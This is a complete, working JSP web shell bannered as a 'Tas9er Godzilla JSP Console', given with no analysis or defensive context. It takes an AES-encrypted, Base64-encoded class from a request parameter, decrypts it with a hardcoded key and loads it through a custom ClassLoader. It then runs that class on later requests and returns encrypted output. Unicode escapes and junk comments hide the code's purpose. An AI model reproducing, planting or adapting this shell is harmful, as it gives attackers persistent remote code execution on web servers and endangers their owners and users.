Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_fg2UnArLywT = "4db8627552482523";
    String govsb_5L7IrlmEL = "Tas9er";
    class govsb_fZDg8yoOw extends /*edusb_Nz1*/ClassLoader {
        public govsb_fZDg8yoOw(ClassLoader govsb_DZJeujnkvQQ) {
            super/*edusb_F*/(govsb_DZJeujnkvQQ);
        }
        public Class govsb_uVhnkdo7(byte[] govsb_fwSsinXSk) {
            return super./*edusb_4rtQekzG*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_zH1Vm7A*/(govsb_fwSsinXSk, 527168-527168, govsb_fwSsinXSk.length);
        }
    }
    public byte[] govsb_YxqHJA(byte[] govsb_ZKVM1XkYOYVX, boolean govsb_fxWZZ) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_8zLI5*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_jW2ADG2bY48B = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_JNMrD36wE*/("AES");
            govsb_jW2ADG2bY48B.init(govsb_fxWZZ?527168/527168:527168/527168+527168/527168,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_Fz1*/SecretKeySpec/*edusb_gyO*/(govsb_fg2UnArLywT.getBytes(), "AES"));
            return govsb_jW2ADG2bY48B.doFinal/*edusb_UAhMv6evC*/(govsb_ZKVM1XkYOYVX);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_LUeGOpF = java.util.Base64./*edusb_SBloYoX*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_Xdvz89s8VNM2*/decode(request.getParameter(govsb_5L7IrlmEL));
        govsb_LUeGOpF = govsb_YxqHJA(govsb_LUeGOpF,false);
        if (session.getAttribute/*edusb_YHKTPt3pJVO*/("payload") == null) {
            session.setAttribute("payload", new govsb_fZDg8yoOw(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_dYM7l7XK2ur*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_26RNhX8E*/.govsb_uVhnkdo7(govsb_LUeGOpF));
        } else {
            request.setAttribute("parameters", govsb_LUeGOpF);
            java.io.ByteArrayOutputStream govsb_Lh6zAfdN3 = new java.io./*edusb_raHd3X1MI2*/ByteArrayOutputStream();
            Object govsb_tRgk1dol = /*edusb_QOUZNPWpRL*/((Class) session.getAttribute("payload"))./*edusb_aKcukw7jlU*//*edusb_Y9chaDZHvYbo*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_PF*/;
            govsb_tRgk1dol.equals(govsb_Lh6zAfdN3);
            govsb_tRgk1dol.equals(pageContext);
            response.getWriter().write("4CE82083F6B60D31CB36A1487F5FD091".substring(527168-527168, 16));
            govsb_tRgk1dol.toString();
            response.getWriter().write(java.util.Base64/*edusb_xeS4Re7kpV7zqV*/.getEncoder()/*edusb_UR*/.encodeToString(govsb_YxqHJA(govsb_Lh6zAfdN3.toByteArray(),true)));
            response.getWriter().write("4CE82083F6B60D31CB36A1487F5FD091".substring(16));
        }
    } catch (Exception e) {
    }
%>